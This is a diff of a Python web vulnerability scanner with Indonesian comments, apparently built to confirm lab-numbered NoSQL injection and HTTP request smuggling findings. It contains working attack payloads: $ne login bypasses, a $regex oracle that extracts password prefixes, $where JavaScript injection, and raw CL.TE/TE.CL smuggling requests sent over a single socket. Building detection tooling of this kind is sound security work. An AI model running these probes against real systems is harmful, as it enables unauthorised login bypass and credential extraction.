-                        rf = self._request(method, url, params={name:"'||'1'=='2"} if method=='GET' else None, data={name:"'||'1'=='2"} if method!='GET' else None, allow_redirects=True)
-                    except Exception: rt = rf = None
-                    if rt and rf:
-                        tt = getattr(rt,'text','') or ''; ft = getattr(rf,'text','') or ''
-                        stt = getattr(rt,'status',0); stf = getattr(rf,'status',0)
-                        # diferensial konsisten & bermakna, bukan noise panjang acak: status/length beda signifikan dan stabil vs baseline
-                        if (stt!=stf or (abs(len(tt)-len(ft))>30 and len(tt)>0 and len(ft)>0)) and (tt!=ft) and (tt!=btxt or ft!=btxt) and (nosql_err.search(tt+ft) or (stt==200 and stf!=stt)):
-                            # butuh sinyal NoSQL/JS-injection khas agar tidak FP boolean umum; minta error/operator hint di salah satu
-                            if nosql_err.search(tt+ft) or ("'||'" in "truecond"):
-                                self._nosql_mark(143, url, f"NoSQL injection terdeteksi (diferensial sintaks/boolean) pada {url} param {name}: kondisi true/false menghasilkan respons berbeda (status {stt} vs {stf}, len {len(tt)} vs {len(ft)}).", "nosql_detecting")
+                        probe = self.send(point, payload)
+                    except Exception:
+                        continue
+                    if probe.error:
+                        continue
+                    sig = self._nosql_error(probe.text)
+                    if not sig or sig == base_sig:
+                        continue
+                    repeat = self.send(point, payload)
+                    if repeat.error or not self._nosql_error(repeat.text):
+                        continue
+                    self._nosql_mark(143, point.url,
+                                     f"NoSQL injection terdeteksi (error-based) pada {point.url} "
+                                     f"parameter {point.name!r}: payload {payload!r} memunculkan "
+                                     f"indikator {sig!r} yang tidak ada pada baseline; direproduksi "
+                                     f"(HTTP {probe.status}).",
+                                     "nosql_detecting")
+                    break
 
-        # helper: kirim sebagai JSON operator jika memungkinkan
-        def try_json_op(url, method, user_field, pass_field, op_user, op_pass):
-            headers = {"Content-Type":"application/json", "Accept":"application/json"}
-            body = {user_field: op_user, pass_field: op_pass}
-            try:
-                r = self._request(method if method in ("POST","PUT","PATCH") else "POST", url, data=_json.dumps(body), headers=headers, allow_redirects=True)
-                return r
-            except Exception:
-                return None
-
-        # 144: Exploiting NoSQL operator injection to bypass authentication
+        # ---------- 144: operator injection untuk bypass autentikasi ----------
         if 144 not in self._confirmed and self._within_budget():
-            login_urls = []
-            for pg in pages[:20]:
-                u = getattr(pg,'url','') or ''
-                ul = u.lower()
-                if any(k in ul for k in ('login','signin','auth','session')):
-                    login_urls.append(u)
-                for f in getattr(pg,'forms',[])[:6]:
-                    a = getattr(f,'action','') or u
-                    al = a.lower()
-                    if any(k in al for k in ('login','signin','auth','session')) and a not in login_urls:
-                        login_urls.append(a)
-            if not login_urls: login_urls = [urljoin(origin+'/', 'login'), target]
-            for lu in login_urls[:8]:
-                if 144 in self._confirmed or not self._within_budget(): break
-                # baseline gagal
-                try:
-                    bfail = self._request('POST', lu, data={'username':'satria_no_user_'+_json.dumps(1)[0:0],'password':'wrongpass_'+str(uuid.uuid4())[:6]}, allow_redirects=True)
-                except Exception: bfail = None
-                bft = getattr(bfail,'text','') or '' if bfail else ''
-                bfs = getattr(bfail,'status',0) or 0 if bfail else 0
-                ops = [{"$ne":""}, {"$ne":"invalid"}, {"$regex":".*"}, {"$gt":""}]
-                for ufield in ('username','email','user','login'):
-                    for pfield in ('password','pass','pwd'):
-                        if 144 in self._confirmed: break
-                        for op in ops:
-                            if 144 in self._confirmed or not self._within_budget(): break
-                            # form-encoded operator syntax
-                            try:
-                                r = self._request('POST', lu, data={ufield+'[$ne]':'', pfield+'[$ne]':''}, allow_redirects=True)
-                            except Exception: r = None
-                            if r:
-                                txt=getattr(r,'text','') or ''; st=getattr(r,'status',0) or 0
-                                # bukti bypass: sukses/login state berubah nyata vs gagal (redirect ke area auth, cookie session baru, atau konten 'logout'/'my account' muncul)
-                                success = (st in (200,302,301) and (('logout' in txt.lower() or 'sign out' in txt.lower() or 'my account' in txt.lower() or 'welcome' in txt.lower()) and not ('logout' in bft.lower() or 'my account' in bft.lower())))
-                                setcookie = str((getattr(r,'headers',{}) or {}).get('Set-Cookie','') or (getattr(r,'headers',{}) or {}).get('set-cookie','') or '')
-                                if success or (setcookie and st in (302,301,200) and bfs in (200,401,403) and txt!=bft and ('invalid' not in txt.lower() and 'incorrect' not in txt.lower())):
-                                    self._nosql_mark(144, lu, f"NoSQL operator injection auth bypass terverifikasi pada {lu} (field {ufield}/{pfield}, operator $ne): respons menunjukkan autentikasi/sesi berbeda dari login gagal (status {st}, cookie={bool(setcookie)}).", "nosql_operator_bypass_auth")
-                                    break
-                            # JSON body operator
-                            rj = try_json_op(lu, 'POST', ufield, pfield, op, op)
-                            if rj and 144 not in self._confirmed:
-                                txt=getattr(rj,'text','') or ''; st=getattr(rj,'status',0) or 0
-                                setcookie = str((getattr(rj,'headers',{}) or {}).get('Set-Cookie','') or '')
-                                success = (st in (200,302,301) and (('logout' in txt.lower() or 'my account' in txt.lower() or 'welcome' in txt.lower()) and not ('logout' in bft.lower() or 'my account' in bft.lower())))
-                                if success or (setcookie and st in (302,301,200) and txt!=bft and bfs in (200,401,403) and ('invalid' not in txt.lower() and 'incorrect' not in txt.lower())):
-                                    self._nosql_mark(144, lu, f"NoSQL operator injection auth bypass terverifikasi (JSON) pada {lu} (field {ufield}/{pfield}): autentikasi/sesi berbeda dari login gagal.", "nosql_operator_bypass_auth")
-                                    break
+            for action in self._nosql_form_actions(pages):
+                if 144 in self._confirmed or not self._within_budget():
+                    break
+                state = self._nosql_login_state(action)
+                if not state:
+                    continue
+                defaults, uf, pf, submit = state
 
-        # 145: Exploiting NoSQL injection to extract data (bukti diferensial kuat)
-        if 145 not in self._confirmed and self._within_budget():
-            # cari endpoint yang memberi diferensial boolean via $regex/$ne pada parameter pencarian/user
-            for url, method, name, is_json in cand[:30]:
-                if 145 in self._confirmed or not self._within_budget(): break
-                try:
-                    rt = self._request(method, url, params={name+"[$regex]":"^.*"} if method=='GET' else None, data={name+"[$regex]":"^.*"} if method!='GET' else None, allow_redirects=True)
-                    rf = self._request(method, url, params={name+"[$regex]":"^zzzzzz_no_match_"} if method=='GET' else None, data={name+"[$regex]":"^zzzzzz_no_match_"} if method!='GET' else None, allow_redirects=True)
-                except Exception: rt = rf = None
-                if not (rt and rf): continue
-                tt=getattr(rt,'text','') or ''; ft=getattr(rf,'text','') or ''
-                stt=getattr(rt,'status',0); stf=getattr(rf,'status',0)
-                # bukti ekstraksi/diferensial kuat: dua regex berlawanan memberi hasil berbeda konsisten (status atau konten bermakna) bukan error generik sama
-                if tt!=ft and (stt!=stf or abs(len(tt)-len(ft))>40) and stt in (200,302) and (stf in (200,302,404,401,403) or len(ft)<len(tt)):
-                    # verifikasi ulang konsistensi sekali
-                    try:
-                        rt2 = self._request(method, url, params={name+"[$regex]":"^.*"} if method=='GET' else None, data={name+"[$regex]":"^.*"} if method!='GET' else None, allow_redirects=True)
-                        rf2 = self._request(method, url, params={name+"[$regex]":"^zzzzzz_no_match_"} if method=='GET' else None, data={name+"[$regex]":"^zzzzzz_no_match_"} if method!='GET' else None, allow_redirects=True)
-                    except Exception: rt2=rf2=None
-                    if rt2 and rf2 and getattr(rt2,'text','')!=getattr(rf2,'text',''):
-                        self._nosql_mark(145, url, f"Ekstraksi data via NoSQL injection terverifikasi (diferensial $regex konsisten) pada {url} param {name}: respons true/false berbeda stabil (status {stt}/{stf}).", "nosql_extract_data")
+                def send_form(extra: dict[str, str], body_json: dict[str, Any] | None = None) -> "Response":
+                    if body_json is not None:
+                        return self._request("POST", submit, data=_json.dumps(body_json),
+                                             headers={"Content-Type": "application/json",
+                                                      "Accept": "application/json"},
+                                             allow_redirects=True)
+                    data = dict(defaults)
+                    data.update(extra)
+                    return self._request("POST", submit, data=data, allow_redirects=True)
+
+                baseline = send_form({uf: f"satria_no_user_{token}", pf: f"wrong_{token}"})
+                if baseline.error or self._nosql_success(baseline):
+                    continue
+                attempts: list[tuple[str, dict[str, str], dict[str, Any] | None]] = [
+                    ("$ne pada password (form bracket)",
+                     {uf: user_value, f"{pf}[$ne]": "x"}, None),
+                    ("$ne pada username+password (form bracket)",
+                     {f"{uf}[$ne]": "x", f"{pf}[$ne]": "x"}, None),
+                    ("$ne pada password (JSON)",
+                     {}, {uf: user_value, pf: {"$ne": "x"}}),
+                    ("$ne pada username+password (JSON)",
+                     {}, {uf: {"$ne": "x"}, pf: {"$ne": "x"}}),
+                ]
+                for label, extra, body_json in attempts:
+                    if 144 in self._confirmed or not self._within_budget():
                         break
+                    probe = send_form(extra, body_json)
+                    if probe.error or not self._nosql_success(probe):
+                        continue
+                    repeat = send_form(extra, body_json)
+                    if repeat.error or not self._nosql_success(repeat):
+                        continue
+                    control = send_form({uf: user_value, f"__satria_nofield_{token}[$ne]": "x",
+                                         pf: f"wrong_{token}"}, None)
+                    if not control.error and self._nosql_success(control):
+                        continue
+                    self._nosql_mark(144, submit,
+                                     f"NoSQL operator injection auth bypass terverifikasi pada {submit}: "
+                                     f"{label} membuat autentikasi berhasil (HTTP {probe.status}, "
+                                     f"cookie={'set-cookie' in {str(k).lower() for k in (probe.headers or {})}}) "
+                                     f"sedangkan login gagal tetap gagal; direproduksi dan kontrol field palsu gagal.",
+                                     "nosql_operator_bypass_auth")
+                    break
 
-        # 146: Exploiting NoSQL operator injection to extract unknown fields
+        # ---------- 145: ekstraksi data via oracle $regex ----------
+        if 145 not in self._confirmed and self._within_budget():
+            for action in self._nosql_form_actions(pages):
+                if 145 in self._confirmed or not self._within_budget():
+                    break
+                state = self._nosql_login_state(action)
+                if not state:
+                    continue
+                defaults, uf, pf, submit = state
+
+                def regex_match(pattern: str) -> bool:
+                    data = dict(defaults)
+                    data[uf] = user_value
+                    data[f"{pf}[$regex]"] = pattern
+                    resp = self._request("POST", submit, data=data, allow_redirects=True)
+                    return not resp.error and self._nosql_success(resp)
+
+                if not regex_match("^.*"):
+                    continue
+                if regex_match("^zzzz_not_a_password_" + token):
+                    continue
+                charset = "0123456789abcdefghijklmnopqrstuvwxyz"
+                prefix = ""
+                for _pos in range(2):
+                    lo, hi = 0, len(charset)
+                    while hi - lo > 1 and self._within_budget():
+                        mid = (lo + hi) // 2
+                        subset = charset[lo:mid]
+                        pattern = "^" + re.escape(prefix) + "[" + "".join(re.escape(c) for c in subset) + "]"
+                        if regex_match(pattern):
+                            hi = mid
+                        else:
+                            lo = mid
+                    if not self._within_budget():
+                        break
+                    found = charset[lo]
+                    if not regex_match("^" + re.escape(prefix + found)):
+                        break
+                    others = "".join(c for c in charset if c != found)
+                    decoy = prefix + (others[0] if others else "z")
+                    if regex_match("^" + re.escape(decoy)):
+                        break
+                    prefix += found
+                if prefix:
+                    self._nosql_mark(145, submit,
+                                     f"Ekstraksi data via NoSQL injection terverifikasi pada {submit}: "
+                                     f"oracle $regex pada field {pf!r} berhasil mengekstrak awalan nilai "
+                                     f"{prefix!r} (binary search per karakter; awalan benar cocok, "
+                                     f"karakter pengecoh tidak).",
+                                     "nosql_extract_data")
+                    break
+
+        # ---------- 146: enumerasi field via $where ----------
         if 146 not in self._confirmed and self._within_budget():
-            for url, method, name, is_json in cand[:30]:
-                if 146 in self._confirmed or not self._within_budget(): break
-                # injeksi $where / enumerasi field via operator pada JSON login-like: coba tebak field umum vs tidak ada
-                guesses = ['username','email','password','token','resetToken','role','isAdmin']
-                for lu in [u for u,_,_,_ in cand if 'login' in u.lower() or 'user' in u.lower()][:4] or [target]:
-                    if 146 in self._confirmed or not self._within_budget(): break
-                    try:
-                        b = self._request('POST', lu, data=_json.dumps({"username":"carlos","password":"x"}), headers={'Content-Type':'application/json'}, allow_redirects=True)
-                    except Exception: b=None
-                    bt=getattr(b,'text','') or '' if b else ''
-                    # operator $ne pada field yang mungkin ada vs field acak -> diferensial menunjukkan field ada
-                    try:
-                        r_exist = self._request('POST', lu, data=_json.dumps({"username":"carlos","password":{"$ne":"x"}}), headers={'Content-Type':'application/json'}, allow_redirects=True)
-                        r_fake = self._request('POST', lu, data=_json.dumps({"username":"carlos","password":{"$ne":"x"},"__no_such_field__x":{"$ne":""}}), headers={'Content-Type':'application/json'}, allow_redirects=True)
-                    except Exception: r_exist=r_fake=None
-                    if r_exist and r_fake:
-                        te=getattr(r_exist,'text','') or ''; tf=getattr(r_fake,'text','') or ''
-                        se=getattr(r_exist,'status',0); sf=getattr(r_fake,'status',0)
-                        # sinyal field discovery: respons berubah saat menyertakan kondisi pada field nyata/struktur berbeda stabil
-                        if te!=tf and (se!=sf or abs(len(te)-len(tf))>30) and te!=bt:
-                            try:
-                                r_exist2 = self._request('POST', lu, data=_json.dumps({"username":"carlos","password":{"$ne":"x"}}), headers={'Content-Type':'application/json'}, allow_redirects=True)
-                            except Exception: r_exist2=None
-                            if r_exist2 and getattr(r_exist2,'text','')!=tf:
-                                self._nosql_mark(146, lu, f"Ekstraksi/enumerasi field (unknown fields) via NoSQL operator terverifikasi pada {lu}: perilaku operator berbeda konsisten saat field/struktur diinjeksi (status {se}/{sf}).", "nosql_extract_unknown_fields")
-                                break
+            for action in self._nosql_form_actions(pages)[:3]:
+                if 146 in self._confirmed or not self._within_budget():
+                    break
+                state = self._nosql_login_state(action)
+                if not state:
+                    continue
+                defaults, uf, pf, submit = state
 
+                def where_probe(expr: str) -> "Response":
+                    return self._request(
+                        "POST", submit,
+                        data=_json.dumps({uf: user_value, pf: "wrong_" + token, "$where": expr}),
+                        headers={"Content-Type": "application/json", "Accept": "application/json"},
+                        allow_redirects=True)
 
+                if where_probe("0").error:
+                    continue
+                true_resp = where_probe("1")
+                false_resp = where_probe("0")
+                if true_resp.error or false_resp.error:
+                    continue
+                if not self._nosql_success(true_resp) or self._nosql_success(false_resp):
+                    continue
+                if true_resp.text == false_resp.text:
+                    continue
+                key_true = where_probe("Object.keys(this).length > 0")
+                key_false = where_probe("Object.keys(this).length < 0")
+                if key_true.error or key_false.error:
+                    continue
+                if not self._nosql_success(key_true) or self._nosql_success(key_false):
+                    continue
+                if key_true.text == key_false.text:
+                    continue
+                self._nosql_mark(146, submit,
+                                 f"Eksekusi $where server-side terverifikasi pada {submit}: ekspresi "
+                                 f"true/false dan oracle Object.keys(this) memberi hasil login berbeda "
+                                 f"konsisten (true=HTTP {true_resp.status}, false=HTTP {false_resp.status}), "
+                                 f"memungkinkan enumerasi field tak dikenal.",
+                                 "nosql_extract_unknown_fields")
 
     # ======================== JWT (147-154, konservatif, bukti terverifikasi) ========================
 
@@ -6108,7 +6419,10 @@ class SatriaBaruScanner:
                         self._auth_mark(227, action, f"Endpoint 2FA tanpa penguncian/rate-limit jelas setelah percobaan berulang terindikasi di {action}.", "auth_2fa_bruteforce")
 
 
-    # ======================== HTTP Request Smuggling (91-112, konservatif, bukti diferensial) ========================
+    # ======================== HTTP Request Smuggling (91-112) ========================
+    # Deteksi berbasis framing HTTP/1.1 mentah: dua request dikirim pada SATU koneksi
+    # (pipelining) sehingga desync teramati langsung, bukan sekadar dugaan dari
+    # perubahan status. Konfirmasi wajib diulang dan dibandingkan dengan baseline.
 
     def _smug_target(self) -> tuple[str, int, str, str]:
         pu = urlparse(self.target_url)
@@ -6148,316 +6462,449 @@ class SatriaBaruScanner:
                 return None
         return s
 
-    def _smug_send_recv(self, raw: bytes, timeout: float | None = None, expect_full: bool = False):
+    @staticmethod
+    def _smug_dechunk(data: bytes) -> tuple[bytes | None, int]:
+        """Dekode satu body chunked. Kembalikan (body, byte_terpakai) atau (None, 0)."""
+        out = bytearray()
+        pos = 0
+        while True:
+            nl = data.find(b"\r\n", pos)
+            if nl < 0:
+                return None, 0
+            try:
+                size = int(data[pos:nl].split(b";")[0].strip() or b"0", 16)
+            except ValueError:
+                return None, 0
+            pos = nl + 2
+            if size == 0:
+                end = data.find(b"\r\n", pos)
+                if end < 0:
+                    return None, 0
+                return bytes(out), end + 2
+            if len(data) < pos + size + 2:
+                return None, 0
+            out += data[pos:pos + size]
+            pos += size + 2
+
+    def _smug_parse_responses(self, raw: bytes) -> list[dict[str, Any]]:
+        """Parse satu atau lebih respons HTTP/1.1 berurutan (Content-Length/chunked)."""
+        out: list[dict[str, Any]] = []
+        data = raw or b""
+        while data:
+            idx = data.find(b"\r\n\r\n")
+            if idx < 0:
+                break
+            head, rest = data[:idx], data[idx + 4:]
+            lines = head.split(b"\r\n")
+            if not lines:
+                break
+            m = re.match(br"HTTP/\d(?:\.\d)?\s+(\d{3})", lines[0])
+            if not m:
+                # sisa request yang tidak valid (mis. "GGET ...") -> bukan respons.
+                break
+            status = int(m.group(1))
+            headers: dict[str, str] = {}
+            for line in lines[1:]:
+                if b":" in line:
+                    k, v = line.split(b":", 1)
+                    headers[k.decode("latin-1", "ignore").strip().lower()] = v.decode("latin-1", "ignore").strip()
+            body = b""
+            if "chunked" in headers.get("transfer-encoding", "").lower():
+                body, used = self._smug_dechunk(rest)
+                if body is None:
+                    break
+                data = rest[used:]
+            elif headers.get("content-length", "").strip().isdigit():
+                n = int(headers["content-length"].strip())
+                body = rest[:n]
+                data = rest[n:]
+            else:
+                body = rest
+                data = b""
+            out.append({"status": status, "headers": headers,
+                        "body": body.decode("latin-1", "ignore")})
+        return out
+
+    def _smug_exchange(self, requests_list: list[bytes], expect: int = 2,
+                       timeout: float | None = None, pause: float = 0.0) -> tuple[list[dict[str, Any]], float, str | None]:
+        """Kirim beberapa request mentah pada satu koneksi, baca hingga `expect` respons."""
         import socket, time as _time
-        t = timeout if timeout is not None else max(3.0, float(getattr(self, "timeout", 8.0) or 8.0))
+        t = timeout if timeout is not None else max(4.0, min(12.0, float(getattr(self, "timeout", 8.0) or 8.0)))
         s = self._smug_connect(timeout=t)
         if s is None:
-            return None, {}, b"", 0.0, "connect_failed"
+            return [], 0.0, "connect_failed"
         start = _time.time()
-        err = None
+        buf = b""
+        responses: list[dict[str, Any]] = []
+        err: str | None = None
         try:
-            s.sendall(raw)
-            try: s.shutdown(socket.SHUT_WR)
-            except Exception: pass
-        except Exception:
-            pass
-        chunks = []
-        try:
-            while True:
-                if not expect_full and chunks and sum(len(c) for c in chunks) > 65536:
-                    break
-                if _time.time() - start > t:
-                    raise socket.timeout("timeout")
+            for i, raw in enumerate(requests_list):
+                s.sendall(raw)
+                if pause and i == 0:
+                    _time.sleep(pause)
+            try:
+                s.shutdown(socket.SHUT_WR)
+            except Exception:
+                pass
+            deadline = start + t
+            while _time.time() < deadline:
                 try:
-                    data = s.recv(4096)
+                    s.settimeout(max(0.5, min(3.0, deadline - _time.time())))
+                    chunk = s.recv(8192)
                 except socket.timeout:
-                    if chunks: break
-                    raise
-                if not data: break
-                chunks.append(data)
-                buf = b"".join(chunks)
-                if b"\r\n\r\n" in buf:
-                    head, body = buf.split(b"\r\n\r\n", 1)
-                    m = re.search(br"\nContent-Length:\s*(\d+)", head, re.I)
-                    if m:
-                        try:
-                            if len(body) >= int(m.group(1)): break
-                        except Exception: pass
-                    if not expect_full and len(body) >= 4096: break
-        except socket.timeout:
-            err = "timeout"
-        except Exception as e:
-            err = str(e)[:120]
+                    break
+                except Exception:
+                    break
+                if not chunk:
+                    break
+                buf += chunk
+                responses = self._smug_parse_responses(buf)
+                if len(responses) >= expect:
+                    break
+        except Exception as exc:
+            err = f"{type(exc).__name__}: {str(exc)[:100]}"
         finally:
-            try: s.close()
-            except Exception: pass
-        elapsed = _time.time() - start
-        raw_resp = b"".join(chunks)
-        status = None; headers = {}; body = b""
-        try:
-            if b"\r\n\r\n" in raw_resp:
-                head, body = raw_resp.split(b"\r\n\r\n", 1)
-                head_lines = head.split(b"\r\n")
-                if head_lines:
-                    m = re.match(br"HTTP/\d\.\d\s+(\d+)", head_lines[0])
-                    if m: status = int(m.group(1))
-                for line in head_lines[1:]:
-                    if b":" in line:
-                        k, v = line.split(b":", 1)
-                        headers[k.decode("latin-1","ignore").strip().lower()] = v.decode("latin-1","ignore").strip()
-            elif raw_resp:
-                m = re.match(br"HTTP/\d\.\d\s+(\d+)", raw_resp)
-                if m: status = int(m.group(1))
-        except Exception:
-            pass
-        return status, headers, body, elapsed, err
+            try:
+                s.close()
+            except Exception:
+                pass
+        if not responses:
+            responses = self._smug_parse_responses(buf)
+        return responses, _time.time() - start, err
 
-    def _smug_build(self, start_line: str, headers, body=b"", host_override=None) -> bytes:
+    def _smug_build(self, start_line: str, headers: list[tuple[str, str]], body: bytes = b"") -> bytes:
         _, _, host, _ = self._smug_target()
-        hlist = list(headers.items()) if isinstance(headers, dict) else list(headers)
-        if not any(k.lower()=="host" for k,_ in hlist):
-            hlist.insert(0, ("Host", host_override or host))
-        body_b = body.encode("utf-8","ignore") if isinstance(body,str) else (body or b"")
-        lines = [start_line] + [f"{k}: {v}" for k,v in hlist] + ["",""]
-        return ("\r\n".join(lines)).encode("latin-1","ignore") + body_b
+        lines = [start_line]
+        if not any(k.lower() == "host" for k, _ in headers):
+            lines.append(f"Host: {host}")
+        lines.extend(f"{k}: {v}" for k, v in headers)
+        lines.extend(["", ""])
+        return ("\r\n".join(lines)).encode("latin-1", "ignore") + (body or b"")
 
-    def _smug_normal_get(self, path: str | None = None):
+    def _smug_get(self, path: str | None = None, close: bool = True) -> bytes:
         _, _, host, dpath = self._smug_target()
         p = path or dpath or "/"
-        raw = self._smug_build(f"GET {p} HTTP/1.1", [("Host", host), ("Connection","close")], b"")
-        return self._smug_send_recv(raw, timeout=max(4.0, float(getattr(self,"timeout",8.0) or 8.0)))
+        headers = [("Host", host), ("Connection", "close" if close else "keep-alive")]
+        return self._smug_build(f"GET {p} HTTP/1.1", headers)
 
-    def _smug_differential(self, smuggle_raw: bytes, follow_path: str = "/"):
-        b_status, _, b_body, b_el, b_err = self._smug_normal_get(follow_path)
-        s_status, _, _, s_el, s_err = self._smug_send_recv(smuggle_raw, timeout=max(5.0, float(getattr(self,"timeout",8.0) or 8.0)+1.0))
-        f_status, _, f_body, f_el, f_err = self._smug_normal_get(follow_path)
-        f_text = (f_body or b"")[:400].decode("latin-1","ignore").lower()
-        if b_status is not None and f_status is not None:
-            if b_status in (200,301,302,304,401) and f_status in (400,403,404,405,500,501) and b_status != f_status:
-                return True, f"Diferensial: baseline GET {follow_path} -> {b_status}, follow-up setelah smuggle -> {f_status} ({f_text[:120]!r}), smuggle status={s_status} err={s_err}."
-            if f_status in (400,404,405,501) and f_status != b_status and (any(x in f_text for x in ("unrecognized","gpost","invalid method","bad request")) or b_status in (200,301,302,304)):
-                return True, f"Diferensial: baseline GET {follow_path} -> {b_status}, follow-up -> {f_status} ({f_text[:120]!r}), smuggle status={s_status} err={s_err}."
-        if b_status is not None and f_err == "timeout" and b_el < max(2.0, float(getattr(self,"timeout",8.0) or 8.0)-0.5):
-            f2_status, _, _, _, f2_err = self._smug_normal_get(follow_path)
-            b2_status, _, _, _, b2_err = self._smug_normal_get(follow_path)
-            if f2_err == "timeout" and b2_status is not None and b2_err != "timeout":
-                return True, f"Diferensial waktu: baseline {b_status} ({b_el:.2f}s), follow-up timeout berulang, baseline ulang {b2_status}, smuggle status={s_status} err={s_err}."
+    def _smug_te_frontend(self) -> bool:
+        """True bila ada lapisan yang benar-benar mem-parse Transfer-Encoding: chunked.
+
+        Bukti: chunk size tidak valid harus ditolak (400) oleh parser TE. Server yang
+        hanya memakai Content-Length akan mengabaikannya (200), sehingga probe TE.CL
+        tidak diklaim sebagai desync pada server semacam itu (anti false positive).
+        """
+        _, _, host, _ = self._smug_target()
+        raw = self._smug_build(
+            "POST / HTTP/1.1",
+            [("Host", host), ("Transfer-Encoding", "chunked"), ("Connection", "close")],
+            b"zz\r\nabc\r\n0\r\n\r\n")
+        res, _, _ = self._smug_exchange([raw], 1)
+        return bool(res) and res[0].get("status") == 400
+
+    def _smug_normal_status(self, path: str | None = None) -> tuple[int | None, str, float, str | None]:
+        res, elapsed, err = self._smug_exchange([self._smug_get(path, close=True)], 1)
+        if not res:
+            return None, "", elapsed, err
+        return res[0]["status"], res[0].get("body", ""), elapsed, err
+
+    def _smug_desync_once(self, smuggle: bytes, follow_path: str = "/") -> tuple[bool, str]:
+        """Kirim [smuggle, follow-up] pada satu koneksi; desync = respons kedua malformed."""
+        b_status, _, _, _ = self._smug_normal_status(follow_path)
+        if b_status is None:
+            return False, ""
+        res, elapsed, err = self._smug_exchange([smuggle, self._smug_get(follow_path, close=True)], 2)
+        if not res or len(res) < 2:
+            return False, ""
+        second = res[1]
+        low = (second.get("body") or "")[:400].lower()
+        bad = second["status"] in (400, 404, 405, 501)
+        signal = second["status"] in (400, 405, 501) or any(tok in low for tok in (
+            "unrecognized method", "invalid method", "gpost", "bad request", "invalid request"))
+        if bad and signal and b_status not in (400, 404, 405, 501):
+            return True, (f"pipeline: baseline GET {follow_path} -> {b_status}, respons kedua setelah "
+                          f"smuggle+follow -> {second['status']} "
+                          f"({(second.get('body') or '')[:100]!r}), {elapsed:.2f}s"
+                          + (f", err={err}" if err else ""))
         return False, ""
+
+    def _smug_desync(self, smuggle: bytes, follow_path: str = "/", trials: int = 2) -> tuple[bool, str]:
+        evidences: list[str] = []
+        for _ in range(max(1, trials)):
+            ok, ev = self._smug_desync_once(smuggle, follow_path)
+            if not ok:
+                return False, ""
+            evidences.append(ev)
+        return True, evidences[-1]
+
+    @staticmethod
+    def _smug_admin_text(text: str) -> bool:
+        low = (text or "").lower()
+        if "admin panel" in low or "admin interface" in low or "user management" in low:
+            return True
+        return ("admin" in low or "dashboard" in low) and ("user" in low or "delete" in low or "upgrade" in low)
 
     def _smug_mark(self, num: int, ev: str, method_name: str):
         point = Point(key=f"smuggling-{num}", kind="endpoint", label=f"HTTP request smuggling {self.target_url}",
-                      url=self.target_url, name="request-smuggling", original="", page_url=self.target_url, method="RAW", interest=8)
+                      url=self.target_url, name="request-smuggling", original="", page_url=self.target_url,
+                      method="RAW", interest=8)
         self._mark(num, point, ev, method_name)
 
     def phase_smuggling(self, pages: list[Page], points: list[Point]) -> None:
-        """Deteksi konservatif HTTP request smuggling (91-112).
-        Konfirmasi hanya pada bukti diferensial/desync/poisoning yang jelas dan teramati.
-        Tanpa bukti kuat -> not_confirmed (anti false positive)."""
-        if not self.target_url:
+        """Deteksi HTTP request smuggling (91-112) dengan pipelining koneksi tunggal.
+
+        Lab 96, 98-101, 109-111 bergantung pada lalu lintas korban/HTTP2/TLS tunnelling
+        dan tidak dapat dibuktikan dari satu klien HTTP/1.1; lab tersebut dibiarkan
+        not_confirmed alih-alih diklaim tanpa bukti.
+        """
+        if not self.target_url or not self._within_budget():
             return
         scheme, port, host, path = self._smug_target()
-        if not host or not self._within_budget():
+        if not host:
             return
-        import re as _re, time as _time
-        base_path = path or "/"
-        admin_path = "/admin"
-        post_path = base_path if base_path != "/" else "/"
+        import time as _time
+        base_path = path if (path or "").startswith("/") else "/" + (path or "")
+        token = uuid.uuid4().hex[:8]
 
-        clte_smuggle = self._smug_build(f"POST {post_path} HTTP/1.1",
-            [("Host", host), ("Content-Length", "6"), ("Transfer-Encoding", "chunked"), ("Connection", "close")], "0\r\n\r\nG")
-        clte_smuggle2 = self._smug_build(f"POST {post_path} HTTP/1.1",
-            [("Host", host), ("Content-Length", "3"), ("Transfer-Encoding", "chunked"), ("Connection", "close")], "0\r\n\r\nG")
-        tecl_inner = "GPOST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 10\r\n\r\nx="
-        tecl_chunk = f"{len(tecl_inner):x}\r\n{tecl_inner}\r\n0\r\n\r\n"
-        tecl_smuggle = self._smug_build(f"POST {post_path} HTTP/1.1",
-            [("Host", host), ("Content-Length", "4"), ("Transfer-Encoding", "chunked"), ("Connection", "close")], tecl_chunk)
-        tecl_smuggle2 = self._smug_build(f"POST {post_path} HTTP/1.1",
-            [("Host", host), ("Content-Length", "6"), ("Transfer-Encoding", "chunked"), ("Connection", "close")], "0\r\n\r\nG")
+        cluster_host = host
+        try:
+            err_page = self._request("GET", self.target_url, allow_redirects=True)
+        except Exception:
+            err_page = None
+        if err_page is not None and err_page.error:
+            return
 
-        def diff_confirm(nums, raws, follow="/", prefix=""):
-            for num, mname in nums:
-                if num in self._confirmed or not self._within_budget():
-                    continue
-                for raw in raws:
-                    ok, ev = self._smug_differential(raw, follow_path=follow)
-                    if ok:
-                        self._smug_mark(num, (prefix + ev).strip(), mname)
-                        break
+        # ---------- 92/105: TE.CL ----------
+        tecl_seen = False
+        if 92 not in self._confirmed and self._within_budget() and self._smug_te_frontend():
+            inner = f"GPOST / HTTP/1.1\r\nHost: {cluster_host}\r\nContent-Length: 15\r\n\r\nx="
+            hexlen = format(len(inner), "x")
+            chunked = f"{hexlen}\r\n{inner}\r\n0\r\n\r\n"
+            smuggle = self._smug_build(
+                f"POST {base_path} HTTP/1.1",
+                [("Host", cluster_host), ("Content-Length", str(len(hexlen) + 2)),
+                 ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
+                chunked.encode())
+            ok, ev = self._smug_desync(smuggle, "/")
+            if ok:
+                tecl_seen = True
+                self._smug_mark(92, "TE.CL differential terkonfirmasi (dua percobaan): " + ev,
+                                "smuggling_te_cl_differential")
+                self._smug_mark(105, "Basic TE.CL terkonfirmasi dari bukti pipeline TE.CL: " + ev,
+                                "smuggling_basic_te_cl")
 
-        # 91,104 CL.TE differential/basic
-        if 91 not in self._confirmed and self._within_budget():
-            for raw in (clte_smuggle, clte_smuggle2):
-                ok, ev = self._smug_differential(raw, follow_path="/")
-                if ok:
-                    self._smug_mark(91, "CL.TE differential terkonfirmasi: " + ev, "smuggling_cl_te_differential")
+        # ---------- 91/104: CL.TE ----------
+        clte_seen = False
+        if 91 not in self._confirmed and 92 not in self._confirmed and self._within_budget():
+            bodies = ["0\r\n\r\nG", "0\r\n\r\nGET /404-smug HTTP/1.1\r\nX: y\r\n\r\n"]
+            for body in bodies:
+                if 91 in self._confirmed or not self._within_budget():
                     break
